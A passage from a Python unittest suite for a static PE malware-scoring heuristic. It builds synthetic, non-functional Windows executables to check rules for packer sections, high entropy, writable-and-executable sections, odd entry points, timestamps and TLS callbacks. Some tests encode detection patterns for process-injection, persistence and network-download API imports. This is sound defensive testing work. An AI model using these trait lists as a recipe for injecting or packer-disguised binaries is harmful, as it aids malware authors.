        self.assertIn(".text2", reason)
        self.assertRegex(reason, r"\(7\.\d\d\)", "the entropy value is shown")

    def test_high_entropy_rule_requires_more_than_4096_bytes(self):
        small = (PEBuilder().add_text(0x400)
                 .add_section(".rand", os.urandom(4096), RDATA_CHARS)
                 .set_entry_in_section(0).sign())
        hits, _ = self.analyse(small, "small.exe")
        self.assertIsNone(delta_for(hits, "High-entropy"))

    def test_low_entropy_section_is_not_flagged(self):
        b = (PEBuilder().add_text(0x400)
             .add_section(".rdata", ASCII_TEXT * 4, RDATA_CHARS)
             .set_entry_in_section(0).sign())
        hits, _ = self.analyse(b)
        self.assertIsNone(delta_for(hits, "High-entropy"))

    def test_writable_and_executable_section_scores_14(self):
        b = (PEBuilder().add_text(0x400)
             .add_section(".text", b"\x90" * 300, WX_CHARS)
             .set_entry_in_section(0).sign())
        hits, _ = self.analyse(b)
        self.assertEqual(delta_for(hits, "writable and executable"), 14)

    def test_write_only_and_execute_only_sections_are_not_wx(self):
        b = (PEBuilder().add_text(0x400)
             .add_section(".data", b"a" * 300, DATA_CHARS)
             .set_entry_in_section(0).sign())
        hits, _ = self.analyse(b)
        self.assertIsNone(delta_for(hits, "writable and executable"))

    def test_nonstandard_section_name_scores_5_and_is_named(self):
        b = (PEBuilder().add_text(0x400)
             .add_section(".vodka", b"a" * 300, RDATA_CHARS)
             .set_entry_in_section(0).sign())
        hits, _ = self.analyse(b)
        # Retuned 8 -> 5: the standard-section list was widened and the score
        # lowered, because real toolchains emit plenty of odd section names.
        self.assertEqual(delta_for(hits, "Non-standard section name"), 5)
        self.assertIn(".vodka", next(r for _d, r in hits if "Non-standard" in r))

    def test_all_standard_section_names_are_accepted(self):
        for name in sorted(H.STANDARD_SECTIONS):
            if len(name) > 8:
                continue                     # cannot fit the 8-byte name field
            with self.subTest(section=name):
                b = (PEBuilder().add_text(0x400)
                     .add_section(name, b"a" * 300, RDATA_CHARS)
                     .set_entry_in_section(0).sign())
                hits, _ = self.analyse(b, "std.exe")
                self.assertIsNone(delta_for(hits, "Non-standard section name"),
                                  f"{name} should be standard")

    def test_zero_raw_size_with_large_virtual_size_scores_12(self):
        # Retuned: the section also has to be *executable* now (an unpacking
        # stub is), because uninitialised-data sections are zero-raw-size by
        # definition and accounted for every clean hit.
        b = (PEBuilder()
             .add_section("UPX0", b"", TEXT_CHARS,
                          virtual_size=0x4000, raw_size=0)
             .add_section(".text", b"\x90" * 0x400, TEXT_CHARS)
             .set_entry_in_section(1).sign())
        hits, _ = self.analyse(b)
        self.assertEqual(delta_for(hits, "zero raw size"), 12)
        self.assertIn("UPX0", next(r for _d, r in hits if "zero raw size" in r))

    def test_zero_raw_size_needs_virtual_size_above_0x1000(self):
        b = (PEBuilder()
             .add_section(".bss", b"", RDATA_CHARS,
                          virtual_size=0x1000, raw_size=0)
             .add_section(".text", b"\x90" * 0x400, TEXT_CHARS)
             .set_entry_in_section(1).sign())
        hits, _ = self.analyse(b)
        self.assertIsNone(delta_for(hits, "zero raw size"))

    # ---- entry point ----------------------------------------------------

    def test_entry_point_in_the_final_section_scores_14(self):
        b = (PEBuilder().add_text(0x400)
             .add_section(".rdata", b"a" * 300, RDATA_CHARS)
             .add_section(".last", b"\x90" * 0x400, TEXT_CHARS)
             .set_entry_in_section(2).sign())
        hits, meta = self.analyse(b)
        self.assertEqual(meta["sections"], 3)
        self.assertEqual(delta_for(hits, "final section"), 14)

    def test_entry_point_in_the_first_section_is_not_flagged(self):
        hits, _ = self.analyse(benign_pe())
        self.assertIsNone(delta_for(hits, "final section"))
        self.assertIsNone(delta_for(hits, "does not fall inside"))
        self.assertIsNone(delta_for(hits, "non-executable section"))

    def test_entry_point_outside_every_section_scores_22(self):
        b = (PEBuilder().add_text(0x400)
             .add_section(".rdata", b"a" * 300, RDATA_CHARS)
             .set_entry_point(0x900000).sign())
        hits, _ = self.analyse(b)
        self.assertEqual(delta_for(hits, "does not fall inside any section"), 22)

    def test_entry_point_in_a_non_executable_section_scores_16(self):
        b = (PEBuilder().add_text(0x400)
             .add_section(".rdata", b"a" * 0x400, RDATA_CHARS)
             .add_section(".last", b"\x90" * 0x400, TEXT_CHARS)
             .set_entry_in_section(1).sign())
        hits, _ = self.analyse(b)
        self.assertEqual(delta_for(hits, "non-executable section"), 16)

    def test_single_section_binary_does_not_trip_the_final_section_rule(self):
        b = PEBuilder().add_text(0x400).set_entry_in_section(0).sign()
        hits, meta = self.analyse(b)
        self.assertEqual(meta["sections"], 1)
        self.assertIsNone(delta_for(hits, "final section"))

    # ---- imports --------------------------------------------------------

    def test_zero_imports_scores_18(self):
        b = (PEBuilder().add_text(0x400)
             .add_section(".data", b"a" * 300, DATA_CHARS)
             .set_entry_in_section(0).sign())
        hits, meta = self.analyse(b)
        self.assertEqual(meta["imports"], 0)
        self.assertEqual(delta_for(hits, "no readable import table"), 18)

    def test_zero_imports_is_not_reported_when_a_packer_explains_it(self):
        b = (PEBuilder().add_text(0x400)
             .add_section("UPX1", b"a" * 300, RDATA_CHARS)
             .set_entry_in_section(0).sign())
        hits, meta = self.analyse(b)
        self.assertEqual(meta["imports"], 0)
        self.assertIsNone(delta_for(hits, "no readable import table"))
        self.assertEqual(delta_for(hits, "Known packer"), 25)

    def test_tiny_import_table_scores_10_and_states_the_count(self):
        for n in (1, 3, 5):
            with self.subTest(n=n):
                funcs = ["CreateFileW", "ReadFile", "WriteFile",
                         "CloseHandle", "ExitProcess"][:n]
                b = (PEBuilder().add_text(0x400)
                     .add_imports({"kernel32.dll": funcs})
                     .set_entry_in_section(0).sign())
                hits, meta = self.analyse(b, f"imp{n}.exe")
                self.assertEqual(meta["imports"], n)
                self.assertEqual(delta_for(hits, "small import table"), 10)
                self.assertIn(f"({n} functions)",
                              next(r for _d, r in hits if "small import" in r))

    def test_six_imports_is_above_the_small_import_threshold(self):
        b = (PEBuilder().add_text(0x400)
             .add_imports({"kernel32.dll": ["CreateFileW", "ReadFile",
                                            "WriteFile", "CloseHandle",
                                            "ExitProcess", "GetLastError"]})
             .set_entry_in_section(0).sign())
        hits, meta = self.analyse(b)
        self.assertEqual(meta["imports"], 6)
        self.assertIsNone(delta_for(hits, "small import table"))

    def test_every_api_group_is_detected_from_imports(self):
        for group, apis in sorted(H.API_GROUPS.items()):
            with self.subTest(group=group):
                # pad to 6+ imports so the small-import rule stays quiet
                names = sorted(apis)[:6]
                while len(names) < 6:
                    names.append(f"Filler{len(names)}")
                b = (PEBuilder().add_text(0x400)
                     .add_imports({"kernel32.dll": names})
                     .set_entry_in_section(0).sign())
                _hits, meta = self.analyse(b, f"g_{group}.exe")
                self.assertIn(group, meta["api_groups"])

    def test_every_combo_rule_fires_with_its_documented_delta(self):
        for groups, delta, reason in H.COMBO_RULES:
            with self.subTest(groups=groups):
                names = []
                for g in groups:
                    names.extend(sorted(H.API_GROUPS[g])[:3])
                b = (PEBuilder().add_text(0x400)
                     .add_imports({"kernel32.dll": [n.title() for n in names]})
                     .set_entry_in_section(0).sign())
                hits, meta = self.analyse(b, "combo.exe")
                self.assertEqual(set(groups) & set(meta["api_groups"]),
                                 set(groups))
                self.assertEqual(delta_for(hits, reason[:30]), delta)

    def test_combo_reason_lists_the_offending_api_names(self):
        b = (PEBuilder().add_text(0x400)
             .add_imports({"kernel32.dll": ["VirtualAllocEx",
                                            "WriteProcessMemory",
                                            "CreateRemoteThread",
                                            "LoadLibraryA", "GetProcAddress",
                                            "CloseHandle"]})
             .set_entry_in_section(0).sign())
        hits, _ = self.analyse(b)
        reason = next(r for _d, r in hits if "Process-injection" in r)
        self.assertIn("virtualallocex", reason)
        self.assertIn("[", reason)
        self.assertIn("]", reason)

    def test_a_single_api_group_alone_does_not_fire_a_combo_rule(self):
        b = (PEBuilder().add_text(0x400)
             .add_imports({"kernel32.dll": sorted(
                 H.API_GROUPS["process_injection"])[:6]})
             .set_entry_in_section(0).sign())
        hits, meta = self.analyse(b)
        self.assertEqual(meta["api_groups"], ["process_injection"])
        for _groups, _delta, reason in H.COMBO_RULES:
            self.assertIsNone(delta_for(hits, reason[:30]))

    def test_imports_across_multiple_dlls_are_all_counted(self):
        b = (PEBuilder().add_text(0x400)
             .add_imports({"kernel32.dll": ["CreateFileW", "ReadFile"],
                           "user32.dll": ["MessageBoxW"],
                           "advapi32.dll": ["RegSetValueExA", "RegCreateKeyExA"],
                           "wininet.dll": ["InternetOpenUrlA", "InternetReadFile"]})
             .set_entry_in_section(0).sign())
        hits, meta = self.analyse(b)
        self.assertEqual(meta["imports"], 7)
        self.assertEqual(meta["api_groups"], ["network", "persistence"])
        self.assertEqual(delta_for(hits, "Autostart-persistence"), 12)

    # ---- timestamp / TLS ------------------------------------------------

    def test_dotnet_assembly_skips_import_table_and_timestamp_rules(self):
        """A managed assembly imports one native stub and carries a
        deterministic-build hash as its timestamp; neither is evidence."""
        p = (PEBuilder(timestamp=0x7FFFFFF0, dll=True)
             .add_text()
             .add_imports({"mscoree.dll": ["_CorDllMain"]})
             .mark_dotnet()
             .write(self.sandbox / "System.Xml.dll"))
        hits, meta = H.analyse_pe(str(p))
        self.assertTrue(meta.get("dotnet"))
        self.assertIsNone(delta_for(hits, "small import table"), reasons(hits))
        self.assertIsNone(delta_for(hits, "in the future"), reasons(hits))
        self.assertEqual(delta_for(hits, ".NET assembly"), 0)
        # The same shape without the CLR header keeps both rules.
        q = (PEBuilder(timestamp=0x7FFFFFF0, dll=True)
             .add_text()
             .add_imports({"kernel32.dll": ["ExitProcess"]})
             .write(self.sandbox / "native.dll"))
        hits, meta = H.analyse_pe(str(q))
        self.assertFalse(meta.get("dotnet"))
        self.assertEqual(delta_for(hits, "small import table"), 10)
        self.assertEqual(delta_for(hits, "in the future"), 4)

    def test_zero_timestamp_is_reported_without_score(self):
        """Retuned 6 -> 0: reproducible builds deliberately zero the stamp, and
        109/426 clean binaries did so."""
        hits, _ = self.analyse(benign_pe(timestamp=0))
        self.assertEqual(delta_for(hits, "Zeroed PE compile timestamp"), 0)

    def test_future_timestamp_scores_4(self):
        """Retuned 8 -> 4: a Rich-header/hash-style stamp decodes as a
        far-future date in a small number of clean binaries."""
        hits, _ = self.analyse(benign_pe(timestamp=2_000_000_001))
        self.assertEqual(delta_for(hits, "timestamp is in the future"), 4)

    def test_timestamp_boundary_is_exactly_2000000000(self):
        hits, _ = self.analyse(benign_pe(timestamp=2_000_000_000), "edge.exe")
        self.assertIsNone(delta_for(hits, "in the future"))
        self.assertIsNone(delta_for(hits, "Zeroed"))

    def test_a_plausible_past_timestamp_is_not_flagged(self):
        hits, _ = self.analyse(benign_pe(timestamp=0x5F5E1000))
        self.assertIsNone(delta_for(hits, "timestamp"))

    def test_tls_callbacks_score_2(self):
        """Retuned 6 -> 2, and it now requires a real callback array: a bare TLS
        directory only means the binary uses thread_local storage."""
        hits, _ = self.analyse(benign_pe().add_tls())
        self.assertEqual(delta_for(hits, "TLS callbacks"), 2)

    def test_a_tls_directory_without_callbacks_is_not_flagged(self):
        hits, _ = self.analyse(benign_pe().add_tls(callbacks=False))
        self.assertIsNone(delta_for(hits, "TLS callbacks"))

    def test_no_tls_directory_is_not_flagged(self):
        hits, _ = self.analyse(benign_pe())
        self.assertIsNone(delta_for(hits, "TLS callbacks"))

    # ---- malformed / non-PE input ---------------------------------------

    def test_truncated_pe_reports_a_malformed_structure(self):
        path = self.sandbox / "trunc.exe"
        path.write_bytes(benign_pe().build()[:120])
        hits, meta = H.analyse_pe(str(path))
        self.assertEqual(hits, [(10, "Malformed PE structure (PEFormatError)")])
        self.assertEqual(meta, {})

    def test_non_pe_file_reports_a_malformed_structure(self):
        path = self.sandbox / "notpe.exe"
        path.write_bytes(b"just some text, definitely not a PE" * 20)
        hits, meta = H.analyse_pe(str(path))
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0][0], 10)
        self.assertIn("Malformed PE structure", hits[0][1])
        self.assertEqual(meta, {})

    def test_missing_file_reports_a_malformed_structure_rather_than_raising(self):
        hits, meta = H.analyse_pe(str(self.sandbox / "nope.exe"))
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0][0], 10)
        self.assertEqual(meta, {})

    # ---- realistic composite -------------------------------------------

    def test_packed_injector_scores_into_the_high_band(self):
        b = (PEBuilder(timestamp=0)
             .add_section("UPX0", b"", TEXT_CHARS,
                          virtual_size=0x8000, raw_size=0)
             .add_section("UPX1", os.urandom(20000), WX_CHARS)
             .add_imports({"kernel32.dll": ["LoadLibraryA", "GetProcAddress",
                                            "VirtualAllocEx",
                                            "WriteProcessMemory",
                                            "CreateRemoteThread",
                                            "CreateToolhelp32Snapshot"]})
             .set_entry_in_section(1))
        hits, meta = self.analyse(b, "packed.exe")
        self.assertEqual(meta["packers"], ["UPX"])
        self.assertGreaterEqual(total(hits), 70)
        self.assertEqual(H.severity_for(min(total(hits), 100)), "high")
        for fragment in ("Known packer", "High-entropy", "writable and executable",
                         "zero raw size", "Process-injection",
                         "Zeroed PE compile timestamp", "Authenticode"):
            self.assertIsNotNone(delta_for(hits, fragment), fragment)


if __name__ == "__main__":
    unittest.main()
